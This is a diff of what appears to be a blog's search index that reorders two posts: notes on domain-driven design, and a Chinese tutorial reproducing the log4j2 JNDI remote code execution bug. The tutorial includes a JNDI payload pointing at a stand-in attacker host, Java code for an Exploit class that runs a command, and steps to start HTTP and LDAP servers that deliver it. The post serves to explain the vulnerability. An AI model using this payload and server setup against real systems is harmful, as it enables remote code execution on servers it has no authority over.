@@ -127,6 +127,91 @@
       </tags>
   </entry>
   <entry>
+    <title>ddd-overview</title>
+    <url>/ddd-overview.html</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>领域驱动设计（Domain-Driven Design，简称DDD）起源于2004年Eric Evans出版《领域驱动设计》，用于应对复杂需求的软件开发。随着近几年微服务架构的普及，DDD 又火起来了</p>
+<p>传统开发中，先根据业务需求设计好数据库 ER 图，然后实现代码。这种方式业务逻辑与技术细节精密耦合不利于后续的需求扩展。DDD 中先进行业务领域建模，再实现代码，让业务逻辑不依赖于技术细节（技术细节越往后决定越好）。</p>
+<p>本篇文章是《领域驱动设计模式、原理与时间》读书笔记总结，重点参数领域驱动设计思想，有疑问地方欢迎讨论。文中的业务场景以会议预定系统为例，详见 <a href="https://www.meetup.com/">Meetup.com</a></p>
+<h2 id="DDD-领域概念"><a href="#DDD-领域概念" class="headerlink" title="DDD 领域概念"></a>DDD 领域概念</h2><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>定义</strong></th>
+<th><strong>举例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>实体</td>
+<td>有身份标识，一般对应业务对象，封装属性（不公开），公开领域行为</td>
+<td>会议是个实体，表示一个唯一被创建的会议，包含会议成员、地点、会议主题等属性，提供创建会议、添加成员、添加评论等领域行为</td>
+</tr>
+<tr>
+<td>值对象</td>
+<td>富含行为，无身份，不可变，参数校验</td>
+<td>会议室地址是个值对象，会校验地址合法性，能清晰的表示业务属性。 手机号值对象封装 long 基元属性，有校验参数，业务语义</td>
+</tr>
+<tr>
+<td>聚合</td>
+<td>一组业务紧密管理的实体和值对象，是数据修改和持久化的基本单元 聚合内保持强一致性，聚合间保持最终一致性</td>
+<td>会议是个聚合，MeetingGroup 实体是该聚合的根实体，组成员、组地点等是附属聚合的值对象。对领域外公开创建会议，添加成员的操作</td>
+</tr>
+<tr>
+<td>存储库</td>
+<td>封装资源（不局限于数据库、文件、网络存储），只公开需要的操作。领域模型映射到持久化存储</td>
+<td>会议聚合的存储、更新、查询都由存储库代理完成</td>
+</tr>
+<tr>
+<td>领域事件</td>
+<td>解耦不同领域的依赖，B 领域需要响应处理 A 领域的操作。同一个微服务中可以是同步事件</td>
+<td>MeetingGroup 申请，申请通过后，会发送事件给会议域，会议域创建 MeetingGroup。解耦会议域与管理员域</td>
+</tr>
+<tr>
+<td>领域服务</td>
+<td>领域服务没有任何属性或数据，只是一个领域行为或动作，不适合放在任何聚合内的逻辑行为</td>
+<td>比如领域内通用的校验逻辑</td>
+</tr>
+<tr>
+<td>应用服务</td>
+<td>应用服务对应到一个具体业务场景，通过编排聚合、资源库、领域事件、外部适配接口、领域服务来完成</td>
+<td>Meeting 创建场景，调用存储库获取 MeetingGroup，调用 MeetingGroup 创建会议，通知会议创建事件（推荐放在领域中）</td>
+</tr>
+</tbody></table>
+<h2 id="战略模式——在限界上下文通信"><a href="#战略模式——在限界上下文通信" class="headerlink" title="战略模式——在限界上下文通信"></a>战略模式——在限界上下文通信</h2><p>战略模式看似很虚，but 是最重要的。与领域专家、PM一起讨论提炼问题域，编写 UL。划分领域和限界上下文（Bouded Context），并确定上下文之间的关系。</p>
+<h3 id="什么是领域、子域和限界上下文？"><a href="#什么是领域、子域和限界上下文？" class="headerlink" title="什么是领域、子域和限界上下文？"></a>什么是领域、子域和限界上下文？</h3><p>领域代表现实世界的特定问题和解决方案的集合。限界上下文（Bouded Context）定义了模型的适用范围，是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754130.png" alt="a8be9348bc53f7d5bb0483328cea4b8d.png"></p>
+<p>子域是问题空间的概念，限界上下文是解空间的概念。所以限界上下文一定可以对应上一个子域（子域可以对应多个上下文）。一个限界上下文就是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754160.png" alt="352208ffb7378dd38e895e782449e9a8.png"></p>
+<h3 id="如何划分限界上下文？"><a href="#如何划分限界上下文？" class="headerlink" title="如何划分限界上下文？"></a>如何划分限界上下文？</h3><p>根据业务概念来划分，实际需要参考团队粒度、技术特点做裁剪</p>
+<p>领域概念只在限界上下文内有意义。比如同样是订单，在不同的上下文表示不同的概念</p>
+<h2 id="战术模式——创建有效的领域模型"><a href="#战术模式——创建有效的领域模型" class="headerlink" title="战术模式——创建有效的领域模型"></a>战术模式——创建有效的领域模型</h2><p>梳理清楚上下文之间的关系后，从战术层面上剖析上下文内部的组织关系</p>
+<p>依次确认值对象、实体、领域服务和聚合根。之后确认基础架构和应用层。</p>
+<p>下图是 Meeting Groups 聚合根的代码细节，Meeting Groups 属于 Meetings 限界上下文。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251755738.png" alt="1591c32ac3414813e9050fe78111980f.png"></p>
+<p>下图是整体服务架构：</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754207.png" alt="92a72233fa22d43e5bab22a3993efd06.png"></p>
+<h3 id="如何区分值对象与实体"><a href="#如何区分值对象与实体" class="headerlink" title="如何区分值对象与实体"></a>如何区分值对象与实体</h3><p>值对象只是问题域的属性和特征。实体具有唯一身份标识，具有行为和生命周期。值对象和传统的 java bean 类似，区别是：不可变，有参数校验。</p>
+<p>以图书馆系统为例，图书具有唯一标识是一个实体，有出租、归还等行为。图书的 ISBN 号是图书的 ID 属性是一个值对象。为什么不把 ISBN 定义为 string 简单字段？以为 ISBN 有一些隐藏属性，包括 ISBN 的类型和合法性校验。</p>
+<h3 id="为什么需要聚合"><a href="#为什么需要聚合" class="headerlink" title="为什么需要聚合"></a>为什么需要聚合</h3><p>一些对象具有不可变条件，以采购系统为例，当采购请求被通过后，不能修改采购项。采购项与采购请求两个实体具有不变条件，放在一个聚合中。</p>
+<p>为保证聚合内的强一致性，外界只能引用聚合根，不能引用聚合内部对象。如有必要，聚合返回内部对象的副本给外界。</p>
+<h3 id="领域模型到底是什么"><a href="#领域模型到底是什么" class="headerlink" title="领域模型到底是什么"></a>领域模型到底是什么</h3><p>描述业务逻辑领域概念，偏向代码实现的领域对象。我将其理解为领域层的整个代码实现</p>
+<p>DDD 将业务分为 4 层：UI、应用、领域、基础。其核心是高度提纯、通用、少变化的领域层。领域层对外暴露业务行为接口，驱动应用层和基础层的设计，是谓“领域驱动设计”。</p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>没找找到合适的 ddd demo 项目，可以参考下面的图书馆系统的代码。这是一个分层架构，包括表示层、应用层、领域层和基础架构层</p>
+<p>repository 存储库接口定义在 model 中，实现在 infra 中。application 对外的接口接收请求。lending 表示借阅上下文</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754252.png" alt="6ba4df47f06a010a9f327bbc4e9aa836.png"></p>
+<p>lending 表示借阅上下文。book 表示一个领域</p>
+<p>为实现依赖倒置，存储库的接口定义在 model 中，实现在 infra 中</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《领域驱动设计模式、原理与实践》</p>
+<p><a href="https://github.com/kgrzybek/modular-monolith-with-ddd">https://github.com/kgrzybek/modular-monolith-with-ddd</a></p>
+<p><a href="https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA">https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA</a></p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>ddd</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>disrupt 实现原理</title>
     <url>/disrupt.html</url>
     <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
@@ -331,91 +416,6 @@
       <tags>
         <tag>javaWeb</tag>
         <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ddd-overview</title>
-    <url>/ddd-overview.html</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>领域驱动设计（Domain-Driven Design，简称DDD）起源于2004年Eric Evans出版《领域驱动设计》，用于应对复杂需求的软件开发。随着近几年微服务架构的普及，DDD 又火起来了</p>
-<p>传统开发中，先根据业务需求设计好数据库 ER 图，然后实现代码。这种方式业务逻辑与技术细节精密耦合不利于后续的需求扩展。DDD 中先进行业务领域建模，再实现代码，让业务逻辑不依赖于技术细节（技术细节越往后决定越好）。</p>
-<p>本篇文章是《领域驱动设计模式、原理与时间》读书笔记总结，重点参数领域驱动设计思想，有疑问地方欢迎讨论。文中的业务场景以会议预定系统为例，详见 <a href="https://www.meetup.com/">Meetup.com</a></p>
-<h2 id="DDD-领域概念"><a href="#DDD-领域概念" class="headerlink" title="DDD 领域概念"></a>DDD 领域概念</h2><table>
-<thead>
-<tr>
-<th><strong>名称</strong></th>
-<th><strong>定义</strong></th>
-<th><strong>举例</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>实体</td>
-<td>有身份标识，一般对应业务对象，封装属性（不公开），公开领域行为</td>
-<td>会议是个实体，表示一个唯一被创建的会议，包含会议成员、地点、会议主题等属性，提供创建会议、添加成员、添加评论等领域行为</td>
-</tr>
-<tr>
-<td>值对象</td>
-<td>富含行为，无身份，不可变，参数校验</td>
-<td>会议室地址是个值对象，会校验地址合法性，能清晰的表示业务属性。 手机号值对象封装 long 基元属性，有校验参数，业务语义</td>
-</tr>
-<tr>
-<td>聚合</td>
-<td>一组业务紧密管理的实体和值对象，是数据修改和持久化的基本单元 聚合内保持强一致性，聚合间保持最终一致性</td>
-<td>会议是个聚合，MeetingGroup 实体是该聚合的根实体，组成员、组地点等是附属聚合的值对象。对领域外公开创建会议，添加成员的操作</td>
-</tr>
-<tr>
-<td>存储库</td>
-<td>封装资源（不局限于数据库、文件、网络存储），只公开需要的操作。领域模型映射到持久化存储</td>
-<td>会议聚合的存储、更新、查询都由存储库代理完成</td>
-</tr>
-<tr>
-<td>领域事件</td>
-<td>解耦不同领域的依赖，B 领域需要响应处理 A 领域的操作。同一个微服务中可以是同步事件</td>
-<td>MeetingGroup 申请，申请通过后，会发送事件给会议域，会议域创建 MeetingGroup。解耦会议域与管理员域</td>
-</tr>
-<tr>
-<td>领域服务</td>
-<td>领域服务没有任何属性或数据，只是一个领域行为或动作，不适合放在任何聚合内的逻辑行为</td>
-<td>比如领域内通用的校验逻辑</td>
-</tr>
-<tr>
-<td>应用服务</td>
-<td>应用服务对应到一个具体业务场景，通过编排聚合、资源库、领域事件、外部适配接口、领域服务来完成</td>
-<td>Meeting 创建场景，调用存储库获取 MeetingGroup，调用 MeetingGroup 创建会议，通知会议创建事件（推荐放在领域中）</td>
-</tr>
-</tbody></table>
-<h2 id="战略模式——在限界上下文通信"><a href="#战略模式——在限界上下文通信" class="headerlink" title="战略模式——在限界上下文通信"></a>战略模式——在限界上下文通信</h2><p>战略模式看似很虚，but 是最重要的。与领域专家、PM一起讨论提炼问题域，编写 UL。划分领域和限界上下文（Bouded Context），并确定上下文之间的关系。</p>
-<h3 id="什么是领域、子域和限界上下文？"><a href="#什么是领域、子域和限界上下文？" class="headerlink" title="什么是领域、子域和限界上下文？"></a>什么是领域、子域和限界上下文？</h3><p>领域代表现实世界的特定问题和解决方案的集合。限界上下文（Bouded Context）定义了模型的适用范围，是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754130.png" alt="a8be9348bc53f7d5bb0483328cea4b8d.png"></p>
-<p>子域是问题空间的概念，限界上下文是解空间的概念。所以限界上下文一定可以对应上一个子域（子域可以对应多个上下文）。一个限界上下文就是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754160.png" alt="352208ffb7378dd38e895e782449e9a8.png"></p>
-<h3 id="如何划分限界上下文？"><a href="#如何划分限界上下文？" class="headerlink" title="如何划分限界上下文？"></a>如何划分限界上下文？</h3><p>根据业务概念来划分，实际需要参考团队粒度、技术特点做裁剪</p>
-<p>领域概念只在限界上下文内有意义。比如同样是订单，在不同的上下文表示不同的概念</p>
-<h2 id="战术模式——创建有效的领域模型"><a href="#战术模式——创建有效的领域模型" class="headerlink" title="战术模式——创建有效的领域模型"></a>战术模式——创建有效的领域模型</h2><p>梳理清楚上下文之间的关系后，从战术层面上剖析上下文内部的组织关系</p>
-<p>依次确认值对象、实体、领域服务和聚合根。之后确认基础架构和应用层。</p>
-<p>下图是 Meeting Groups 聚合根的代码细节，Meeting Groups 属于 Meetings 限界上下文。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251755738.png" alt="1591c32ac3414813e9050fe78111980f.png"></p>
-<p>下图是整体服务架构：</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754207.png" alt="92a72233fa22d43e5bab22a3993efd06.png"></p>
-<h3 id="如何区分值对象与实体"><a href="#如何区分值对象与实体" class="headerlink" title="如何区分值对象与实体"></a>如何区分值对象与实体</h3><p>值对象只是问题域的属性和特征。实体具有唯一身份标识，具有行为和生命周期。值对象和传统的 java bean 类似，区别是：不可变，有参数校验。</p>
-<p>以图书馆系统为例，图书具有唯一标识是一个实体，有出租、归还等行为。图书的 ISBN 号是图书的 ID 属性是一个值对象。为什么不把 ISBN 定义为 string 简单字段？以为 ISBN 有一些隐藏属性，包括 ISBN 的类型和合法性校验。</p>
-<h3 id="为什么需要聚合"><a href="#为什么需要聚合" class="headerlink" title="为什么需要聚合"></a>为什么需要聚合</h3><p>一些对象具有不可变条件，以采购系统为例，当采购请求被通过后，不能修改采购项。采购项与采购请求两个实体具有不变条件，放在一个聚合中。</p>
-<p>为保证聚合内的强一致性，外界只能引用聚合根，不能引用聚合内部对象。如有必要，聚合返回内部对象的副本给外界。</p>
-<h3 id="领域模型到底是什么"><a href="#领域模型到底是什么" class="headerlink" title="领域模型到底是什么"></a>领域模型到底是什么</h3><p>描述业务逻辑领域概念，偏向代码实现的领域对象。我将其理解为领域层的整个代码实现</p>
-<p>DDD 将业务分为 4 层：UI、应用、领域、基础。其核心是高度提纯、通用、少变化的领域层。领域层对外暴露业务行为接口，驱动应用层和基础层的设计，是谓“领域驱动设计”。</p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>没找找到合适的 ddd demo 项目，可以参考下面的图书馆系统的代码。这是一个分层架构，包括表示层、应用层、领域层和基础架构层</p>
-<p>repository 存储库接口定义在 model 中，实现在 infra 中。application 对外的接口接收请求。lending 表示借阅上下文</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754252.png" alt="6ba4df47f06a010a9f327bbc4e9aa836.png"></p>
-<p>lending 表示借阅上下文。book 表示一个领域</p>
-<p>为实现依赖倒置，存储库的接口定义在 model 中，实现在 infra 中</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《领域驱动设计模式、原理与实践》</p>
-<p><a href="https://github.com/kgrzybek/modular-monolith-with-ddd">https://github.com/kgrzybek/modular-monolith-with-ddd</a></p>
-<p><a href="https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA">https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA</a></p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>ddd</tag>
       </tags>
   </entry>
   <entry>
@@ -1028,38 +1028,6 @@
       </tags>
   </entry>
   <entry>
-    <title>log4j2 远程执行漏洞原理与复现</title>
-    <url>/log4j2-rce.html</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
-<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
-<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
-<p>黑客服务器（ladp + http）</p>
-<p>从该请求中注入字符串的日志语句</p>
-<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
-<li>发送包含恶意字符串的请求（通过任何协议）</li>
-<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
-<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
-<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
-<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
-</ol>
-<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
-<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会在 mac 系统上启动计算器</p>
-<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
-<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
-<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
-<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
-]]></content>
-      <tags>
-        <tag>log4j</tag>
-        <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kafka实现原理</title>
     <url>/kafka-overview.html</url>
     <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>主要讲解 Consumer 相关知识</p>
@@ -1137,6 +1105,38 @@
       </categories>
       <tags>
         <tag>kafka</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>log4j2 远程执行漏洞原理与复现</title>
+    <url>/log4j2-rce.html</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
+<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
+<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
+<p>黑客服务器（ladp + http）</p>
+<p>从该请求中注入字符串的日志语句</p>
+<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
+<li>发送包含恶意字符串的请求（通过任何协议）</li>
+<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
+<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
+<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
+<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
+</ol>
+<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
+<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会在 mac 系统上启动计算器</p>
+<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
+<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
+<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
